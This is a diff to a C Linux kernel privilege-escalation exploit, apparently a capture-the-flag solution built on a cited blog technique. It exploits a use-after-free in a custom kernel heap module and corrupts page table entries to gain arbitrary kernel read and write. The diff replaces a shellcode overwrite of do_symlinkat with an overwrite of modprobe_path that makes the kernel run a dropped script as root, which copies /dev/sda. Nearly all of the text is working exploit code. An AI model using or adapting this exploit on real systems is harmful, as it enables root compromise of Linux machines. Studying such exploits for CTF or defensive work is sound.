@@ -1,5 +1,4 @@
 #include "libs/pwn.h"
-#include "linux6.6.22/shellcode.h"
 #include <sys/sendfile.h>
 #include <sched.h>
 #include <sys/wait.h>
@@ -10,39 +9,34 @@
 
 /*
  * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
- * this version overwrites do_symlinkat with privilige escalation shellcode
+ * this version overwrite modprobe for privilige escalation
  */
 
-int fd, dmafd, ezfd = -1;
-static void win() {
-  char buf[0x100];
-  int fd = open("/dev/sda", O_RDONLY);
-  if (fd < 0) {
-    puts("[-] Lose...");
-  } else {
-    puts("[+] Win!");
-    read(fd, buf, 0x100);
-    write(1, buf, 0x100);
-    puts("[+] Done");
-  }
-  exit(0);
-}
+#define PAYLOAD "#!/bin/sh\ncat /dev/sda > /tmp/flag"
 
-uint64_t user_cs, user_ss, user_rsp, user_rflags;
-static void save_state() {
-  asm(
-      "movq %%cs, %0\n"
-      "movq %%ss, %1\n"
-      "movq %%rsp, %2\n"
-      "pushfq\n"
-      "popq %3\n"
-      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
-      :
-      : "memory");
+// trigger modprobe
+int win()
+{
+  int fd, count;
+
+  fd = SYSCHK(open("/tmp/mp", O_RDWR | O_CREAT | O_TRUNC, S_IXUSR));
+  SYSCHK(write(fd, PAYLOAD, strlen(PAYLOAD)));
+  SYSCHK(close(fd));
+
+  fd = SYSCHK(open("/tmp/ptr-yudai", O_RDWR | O_CREAT | O_TRUNC, S_IXUSR));
+  CHK(write(fd, "\xff\xff\xff\xff", 4) == 4);
+  SYSCHK(close(fd));
+
+  // supposed to fail
+  execlp("/tmp/ptr-yudai", NULL);
+
+  fd = SYSCHK(open("/tmp/flag", O_RDONLY));
+  count = SYSCHK(sendfile(STDOUT_FILENO, fd, NULL, 0x40));
+  SYSCHK(close(fd));
+  return count != 0;
 }
 
 #define N_SPRAY 0x400
-// size for direct cross cache attack
 #define PTE_SIZE 0x10000
 
 int main(int argc, char* argv[]) {
@@ -53,7 +47,6 @@ int main(int argc, char* argv[]) {
 
   puts("[+] INIT");
   pin_cpu(0, 0);
-  save_state();
   init();
   
   for (int i = 0; i < N_SPRAY; i++)
@@ -61,7 +54,7 @@ int main(int argc, char* argv[]) {
              PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
 
   puts("[+] create dangeling ptr");
-  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT); 
+  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL); 
   keap_write(ptr, leak, PTE_SIZE);
   keap_free(ptr);
 
@@ -84,13 +77,13 @@ int main(int argc, char* argv[]) {
   keap_write(ptr, &pte, 0x8);
 
   puts("[+] find corrupted page");
-  void *vuln = 0;
+  uint64_t *vuln = 0;
   uint64_t physbase = 0;
   for (int i = 0; i < N_SPRAY; i ++) {
     for (int j = 0; j < 8; j++) {
       if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
         vuln = (uint64_t*)(spray[i]+j*0x1000);
-        physbase = (*(uint64_t*)vuln & ~0xfff);
+        physbase = (*vuln & ~0xfff);
         break;
       }
     }
@@ -103,13 +96,12 @@ int main(int argc, char* argv[]) {
   printf("[+] physbase = 0x%lx\n", physbase);
 
   puts("[+] corrupt PTE into AAW/AAR");
-  // grep do_symlinkat /proc/kallsyms
-  // 0xffffffff811bbe10
-  uint64_t do_symlinkat_func = 0x11bbe10;
-  // physbase with nokaslr + 0x3000 (only if kaslr is enabled)
+  // find/g 0xffff888000000000, 0xffff888005000000, 0x6f6d2f6e6962732f
+  uint64_t modprobe = 0x1eac600;
+  // physbase with nokaslr + 0x3000
   uint64_t offset = 0x2401000 + 0x3000;
 
-  pte = 0x8000000000000067|(physbase+(do_symlinkat_func & ~0xfff)-offset);
+  pte = 0x8000000000000067|(physbase+(modprobe&~0xfff)-offset);
 
   keap_write(ptr, &pte, 0x8);
 
@@ -119,7 +111,7 @@ int main(int argc, char* argv[]) {
 #endif
 
   // reload pte or sth idk
-  void* old_vuln = vuln;
+  uint64_t old_vuln = vuln;
   vuln = NULL;
   for (int i = 0; i < N_SPRAY; i ++) {
     for (int j = 0; j < 8; j++) {
@@ -133,24 +125,12 @@ int main(int argc, char* argv[]) {
   }
   CHK(vuln == old_vuln);
 
+  puts("[+] overwriting modprobe_path");
+  vuln[(modprobe&0xfff)/8] = *(uint64_t*) "/tmp/mp";
+
 #ifdef DEBUG
-  keap_read(ptr, leak, PTE_SIZE);
-  print_hex(leak, 0x80);
+  print_hex(vuln, 0x40);
 #endif
 
-  puts("[+] preparing shellcode");
-  void *p;
-  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
-  *(size_t*)p = (size_t)&win;
-  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
-  *(size_t*)p = user_rflags;
-  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
-  *(size_t*)p = user_rsp;
-
-  puts("[+] overwriting do_symlinkat_at");
-  memcpy(vuln + (do_symlinkat_func & 0xfff), shellcode, sizeof(shellcode));
-
-  printf("%d\n", symlink("/jail/x", "/jail"));
-  puts("[-] Failed...");
-
+  return win();  
 }
